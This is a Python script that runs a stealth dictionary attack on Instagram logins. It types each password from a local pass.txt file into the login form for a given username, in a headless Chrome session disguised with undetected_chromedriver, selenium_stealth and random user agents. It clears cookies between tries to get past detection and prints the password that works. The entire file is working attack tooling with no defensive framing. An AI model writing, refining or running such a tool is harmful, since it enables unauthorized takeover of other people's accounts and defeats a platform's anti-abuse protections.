import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from fake_useragent import UserAgent
from selenium_stealth import stealth
import time
import os

current_directory = os.path.dirname(os.path.abspath(__file__))

# Instagram credentials
username = input("Enter the username:  ")  # Replace with your actual username
password_file = os.path.join(current_directory, "pass.txt")  # Path to your password file

# Read all passwords from the file
with open(password_file, "r") as file:
    passwords = [line.strip() for line in file if line.strip()]

# Start undetected Chrome session
ua = UserAgent()
options = uc.ChromeOptions()
options.headless = True
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument(f"user-agent={ua.random}")

driver = uc.Chrome(options=options)
stealth(driver,
        languages=["en-US", "en"],
        vendor="Google Inc.",
        platform="Win32",
        webgl_vendor="Intel Inc.",
        renderer="Intel Iris OpenGL Engine",
        fix_hairline=True,
        )


driver.get("https://www.instagram.com/accounts/login/")
time.sleep(3)  # Wait for the page to load

# Locate the username and password fields
username_input = driver.find_element(By.NAME, "username")
password_input = driver.find_element(By.NAME, "password")

# Set the username once
username_input.clear()
username_input.send_keys(username)

# Attempt each password
for password in passwords:
    print(f"Trying password: {password}")

    password_input.send_keys(Keys.CONTROL + 'a')  # Select all existing text
    password_input.send_keys(Keys.DELETE)         # Delete selected text
    time.sleep(2)  # Small delay for realism

    # Enter the next password
    password_input.send_keys(password)
    password_input.send_keys(Keys.RETURN)  # Submit form
    time.sleep(2.5)
    driver.delete_all_cookies()

    # Check for login success (for example, URL check or specific element check)
    if "login" not in driver.current_url:
        print(f"Login successful with password: {password}")
        break
    else:
        print(f"Login failed with password: {password}")
else:
    print("Password not found in the provided list.")
        
# Close the driver after all attempts
driver.quit()

